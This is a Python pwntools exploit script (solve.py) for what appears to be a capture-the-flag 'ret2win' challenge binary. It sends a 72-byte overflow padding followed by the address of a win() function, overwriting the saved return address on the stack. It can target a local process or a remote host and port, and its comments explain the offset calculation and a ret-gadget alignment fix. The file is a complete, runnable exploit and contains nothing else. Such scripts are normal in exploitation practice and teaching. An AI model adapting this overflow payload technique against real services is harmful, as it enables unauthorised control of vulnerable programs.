#!/usr/bin/env python3
# solve.py — ret2win exploit
# Usage:
#   Local:  python3 solve.py LOCAL
#   Remote: python3 solve.py REMOTE <host> <port>
import sys as _sys; _argv = _sys.argv[:]  # capture before pwntools import
from pwn import *

# ── Binary context ─────────────────────────────────────────────────────────────
context.binary = elf = ELF('./ret2win', checksec=False)
context.arch    = 'amd64'

# ── Addresses ──────────────────────────────────────────────────────────────────
WIN    = elf.symbols['win']    # 0x401186  (fixed — no PIE)
RET    = 0x401016              # `ret` gadget — for stack realignment if ever needed

# ── Offset calculation ─────────────────────────────────────────────────────────
# vuln():
#   sub $0x40, %rsp  → buf is 64 bytes
#   buf[64] + saved RBP[8] = 72 bytes before saved RIP
OFFSET = 72

# ── Connect ─────────────────────────────────────────────────────────────────────
if len(_argv) > 1 and _argv[1] == 'REMOTE':
    host = _argv[2] if len(_argv) > 2 else '127.0.0.1'
    port = int(_argv[3]) if len(_argv) > 3 else 4444
    p = remote(host, port)
else:
    p = process('./ret2win')

# ── Build payload ───────────────────────────────────────────────────────────────
payload  = b'A' * OFFSET
payload += p64(WIN)
# Note: if fopen() crashes due to SSE/MOVAPS alignment, prepend p64(RET):
#   payload += p64(RET) + p64(WIN)

# ── Send & receive ──────────────────────────────────────────────────────────────
p.recvuntil(b'Enter your name: ')
p.send(payload)
print(p.recvall().decode(errors='replace'))
